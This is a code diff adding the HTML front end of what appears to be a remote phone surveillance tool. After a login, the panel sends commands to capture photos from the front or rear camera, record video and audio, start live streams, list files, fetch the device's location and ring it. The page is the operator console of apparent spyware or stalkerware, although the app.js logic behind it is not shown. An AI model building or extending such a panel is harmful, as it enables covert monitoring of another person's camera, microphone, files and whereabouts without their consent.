@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Panel</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="app">
+        <div id="login" style="display: none;">
+            <h1>Surveillance Panel</h1>
+            <input type="email" id="email" placeholder="Email">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="login()">Login</button>
+            <p id="error"></p>
+        </div>
+        <div id="panel" style="display: none;">
+            <h1>Surveillance Control Panel</h1>
+            <button onclick="logout()">Logout</button>
+            <h2>Capture Photo</h2>
+            <select id="photo-camera">
+                <option value="rear">Rear Camera</option>
+                <option value="front">Front Camera</option>
+            </select>
+            <input type="checkbox" id="photo-flash"> Flash
+            <button onclick="sendCommand('photo')">Capture Photo</button>
+
+            <h2>Record Video</h2>
+            <select id="video-camera">
+                <option value="rear">Rear Camera</option>
+                <option value="front">Front Camera</option>
+            </select>
+            <select id="video-quality">
+                <option value="480p">480p</option>
+                <option value="720p" selected>720p</option>
+                <option value="1080p">1080p</option>
+            </select>
+            <input type="number" id="video-duration" value="60" min="60" max="600"> Duration (seconds)
+            <button onclick="sendCommand('video')">Record Video</button>
+
+            <h2>Record Audio</h2>
+            <input type="number" id="audio-duration" value="60" min="60" max="600"> Duration (seconds)
+            <button onclick="sendCommand('audio')">Record Audio</button>
+
+            <h2>Stream</h2>
+            <select id="stream-type">
+                <option value="video_audio">Video + Audio</option>
+                <option value="audio">Audio Only</option>
+            </select>
+            <select id="stream-camera">
+                <option value="rear">Rear Camera</option>
+                <option value="front">Front Camera</option>
+            </select>
+            <button onclick="sendCommand('stream')">Start Stream</button>
+
+            <h2>Files</h2>
+            <button onclick="sendCommand('files', { action: 'list' })">List Files</button>
+            <div id="file-list"></div>
+
+            <h2>Location</h2>
+            <button onclick="getLocation()">Get Location</button>
+            <p id="location"></p>
+
+            <h2>Ring Device</h2>
+            <button onclick="sendCommand('ring')">Ring and Vibrate</button>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="app.js"></script>
+</body>
+</html>
